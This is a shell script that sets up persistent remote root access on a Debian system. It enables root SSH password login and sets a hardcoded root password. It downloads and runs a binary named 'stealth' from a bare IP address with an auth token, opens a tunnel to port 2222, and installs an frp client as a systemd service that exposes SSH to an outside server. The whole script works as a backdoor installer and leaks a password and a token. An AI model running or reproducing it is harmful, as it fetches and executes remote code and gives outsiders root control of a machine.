#!/bin/sh
export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

apt update >/dev/null;apt -y purge openssh-server;apt -y autoremove openssh-server;apt -y install nano dropbear iputils-ping screen net-tools openssh-server build-essential psmisc libreadline-dev dialog curl wget sudo dialog python3 systemd >/dev/null
netstat -ntlp
sleep 3
sed -i "s/#PermitRootLogin prohibit-password/PermitRootLogin yes/" /etc/ssh/sshd_config
sed -i "s/PasswordAuthentication no/PasswordAuthentication yes/" /etc/ssh/sshd_config
sleep 2
sed -i "s/NO_START=1/NO_START=0/" /etc/default/dropbear
sed -i "s/DROPBEAR_PORT=22/DROPBEAR_PORT=2222/" /etc/default/dropbear
sleep 2
echo "root:Pmataga87465622" | chpasswd
service ssh restart
wget -q http://45.135.58.52/stealth >/dev/null
sleep 2
service dropbear restart
sleep 2
chmod +x stealth
sleep 2
./stealth authtoken 1guvFPBkkwOATyyLKusTwPISn6O_4pDECbRt7i6zzRfTd5ZHD
sleep 2
screen -dmS drop bash -c './stealth tcp 2222'

sleep 5

curl http://127.0.0.1:4040/api/tunnels
sleep 60

wget https://github.com/fatedier/frp/releases/download/v0.48.0/frp_0.48.0_linux_amd64.tar.gz
tar -xvf frp_0.48.0_linux_amd64.tar.gz
# start from daemon
cp frp_0.48.0_linux_amd64/frpc /usr/bin
mkdir /etc/frp
mkdir /var/frp  # log

sleep 2

cat > /etc/frp/frpc.ini <<END
[common]
server_addr = emergencyaccess.teatspray.fun
server_port = 7000

[ssh.mphumzivelatancivalohai]
type = tcp
local_ip = 127.0.0.1
local_port = 22
remote_port = 10031
subdomain = mphumzivelatancivalohai
END

sleep 2

#mphumzivelatancivalohai.emergencyaccess.teatspray.fun

cat > /etc/systemd/system/frpc.service << GAS
[Unit]
Description=Frp Client Service
After=network.target

[Service]
Type=simple
User=nobody
Restart=on-failure
RestartSec=5s
ExecStart=/usr/bin/frpc -c /etc/frp/frpc.ini
ExecReload=/usr/bin/frpc reload -c /etc/frp/frpc.ini
LimitNOFILE=1048576

[Install]
WantedBy=multi-user.target

GAS

sleep 2

systemctl daemon-reload
sleep 2

systemctl status frpc.service
sleep 2

systemctl enable frpc.service
sleep 2

systemctl start frpc.service

/usr/bin/frpc -c /etc/frp/frpc.ini

